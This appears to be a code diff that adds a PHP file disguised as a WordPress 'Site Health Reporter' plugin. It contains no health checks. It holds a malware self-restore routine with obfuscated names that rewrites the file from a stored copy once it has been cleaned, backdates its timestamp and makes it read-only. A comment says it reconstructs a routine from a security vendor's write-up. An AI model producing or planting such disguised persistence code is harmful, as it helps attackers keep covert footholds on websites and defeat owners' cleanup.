@@ -1,0 +1,20 @@
+<?php
+/**
+ * Plugin Name: Site Health Reporter
+ * Description: Automated health checks and reporting.
+ */
+// Reconstruction of the restore routine in Wordfence's write-up (2026-09).
+function dw9_2yhlyjj8r4k_uq81() { return 1577836800 + 86400 * 97; }
+function sc_restore_self() {
+	$size = @filesize(__FILE__);
+	if ($size && $size > 5000) {
+		return;
+	}
+	$saved = a09ip7sgac4aqyl1gr5('src', "");
+	if ($saved && is_string($saved)) {
+		@chmod(__FILE__, 0644);
+		@file_put_contents(__FILE__, $saved);
+		@touch(__FILE__, dw9_2yhlyjj8r4k_uq81());
+		@chmod(__FILE__, 0444);
+	}
+}
